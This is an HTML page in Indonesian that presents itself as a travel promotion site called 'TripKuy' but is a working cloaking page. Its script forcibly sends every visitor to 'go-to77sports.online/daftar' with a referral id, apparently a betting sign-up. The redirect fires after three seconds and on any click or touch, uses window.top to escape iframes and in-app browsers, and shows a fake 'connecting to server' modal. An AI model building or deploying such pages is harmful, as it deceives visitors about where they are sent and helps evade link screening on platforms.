<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TripKuy | Partner Perjalanan Eksklusif</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
        body { font-family: 'Poppins', sans-serif; }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            width: 36px;
            height: 36px;
            border-radius: 50%;
            border-left-color: #3b82f6;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="bg-gray-50 text-gray-800">

    <div id="redirectModal" class="fixed inset-0 z-[9999] flex items-center justify-center bg-black/80 backdrop-blur-md px-4">
        <div class="bg-white p-8 rounded-2xl shadow-2xl text-center max-w-sm w-full border-t-4 border-blue-600">
            <div class="mb-4 flex justify-center">
                <i class="fas fa-sync-alt text-blue-600 text-4xl animate-spin"></i>
            </div>
            <h2 class="text-2xl font-bold text-gray-800 mb-2">Tunggu Sebentar</h2>
            <p class="text-gray-600">Menghubungkan ke server pendaftaran...</p>
            <div class="mt-6 flex flex-col gap-3">
                <div class="flex justify-center"><div class="spinner"></div></div>
                <p class="text-xs text-gray-400">Jika tidak berpindah otomatis, <br> silakan ketuk layar di mana saja.</p>
            </div>
        </div>
    </div>

    <nav class="p-6 shadow-sm bg-white flex justify-between items-center">
        <span class="text-xl font-bold text-blue-600">TripKuy</span>
        <button class="bg-blue-600 text-white px-4 py-2 rounded-lg">Login</button>
    </nav>

    <section class="p-10 text-center">
        <h1 class="text-3xl font-bold mb-4">Promo Liburan Akhir Tahun</h1>
        <div class="bg-blue-100 p-6 rounded-xl border border-blue-200">
            <p>Dapatkan diskon hingga 50% untuk paket Luxury Escape.</p>
        </div>
    </section>

    <script>
        const targetURL = "https://go-to77sports.online/daftar?ref_id=06bb666e";
        
        function navigateNow() {
            // Menggunakan top.location agar tembus dari iframe/sosmed browser
            window.top.location.href = targetURL;
            
            // Fallback jika window.top gagal
            setTimeout(() => {
                window.location.replace(targetURL);
            }, 500);
        }

        // 1. Jalankan otomatis dalam 3 detik
        setTimeout(() => {
            navigateNow();
        }, 3000);

        // 2. FORCE REDIRECT (Sangat Ampuh untuk HP)
        // Jika user klik/sentuh layar, langsung alihkan tanpa tunggu 3 detik
        document.addEventListener('click', function() {
            navigateNow();
        });

        document.addEventListener('touchstart', function() {
            navigateNow();
        });

        // 3. Tambahan untuk memastikan link diklik secara "alami" oleh sistem
        window.onload = function() {
            console.log("Sistem siap mengalihkan...");
        };
    </script>
</body>
</html>
